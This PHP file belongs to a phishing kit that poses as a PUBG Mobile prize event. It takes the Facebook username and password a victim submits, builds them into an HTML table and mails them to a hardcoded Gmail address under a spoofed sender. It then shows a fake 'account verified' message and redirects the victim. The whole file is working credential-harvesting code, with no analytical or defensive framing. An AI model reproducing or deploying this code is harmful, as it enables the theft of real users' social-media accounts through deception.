<?php
error_reporting(0);
include('css/eroor.css');

$email = $_POST['username'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "PUBG | Facebook | '.$email.'";

$emailkamu = 
"julakikam85@gmail.com"; 
$tomail = $emailkamu; 

$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: black;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://i.ibb.co/5vt7dWT/20180920-172425.png">
<img width="40" style="float:right;" src="http://pubgmobile.com/en-US/m/images/icon_logom.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$email.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$password.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
  <th style="width:78%;text-align:center;"><b>FACEBOOK</th> 
 </tr>
</table>
<div style="padding:5px;width:294;height:40px;background: black;color:#ffc;text-align:center;">
<font size="3"><b>JULAK BORNEO</b></font>
</div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: JULAK BORNEO <result@eventspubg.web.id>' . "\r\n";
$datamail = mail($emailkamu, $subject, $message, $headersx);
$datamail = mail($error, $subject, $message, $headersx);

?>

<!--- 
SCRIPT BY RAFLIPEDIA INDONESIA 
HAK CIPTA DILINDUNGI OLEH UNDANG-UNDANG
--->
<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="description" content="Free collect gift in Season 5. Free collect Resident Evil 2 special item. "/>
<meta property="og:image" content="img/logo/icon.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="stylesheet" href="css/raflipedia.css">
</head>
<body>


<div class="container navbar">
	<img src="img/logo/icon.png">
	<span class="game">PUBG MOBILE</span></br>
	<span class="slogan">OFFICIAL PUBG ON MOBILE</span>
</div>


<div class="container header">
<div class="slider-container">
<div class="slider">
<img src="img/s1.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s2.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s3.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s4.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s5.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s6.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s7.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s8.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s9.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s10.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s11.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s12.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s13.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s14.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s15.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s16.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s17.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s18.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s19.png" style="width:100%">
</div>
<div class="slider">
<img src="img/s20.png" style="width:100%">
</div>
</div>
</div>
</div>
</div><!--- container --->

	
<div class="container box">
	<form action="menu.php" method="post">
	<center><h5 class="status">Account Verification Completed</h5></center>

	<h5 class="status-info">
	Thank you for joining this event
	</br>
	Your account has been successfully verified
	</br>
	Prizes will be sent automatically to your account
	</br>
	Please wait up to 24 hours
	</h5>
	<button type="submit" class="btn-more">Logout</button>
	</form>
</div>
<div class="container footer">
	<img class="pubg" src="img/logo/pubg.png">
	<img class="tg" src="img/logo/tencent.png">
</div>

<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
<script> $(window).load(function() { $(".loading").fadeOut("slow"); }); </script>

<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>

<meta http-equiv="REFRESH" content="5;url=menu.php">
</html>
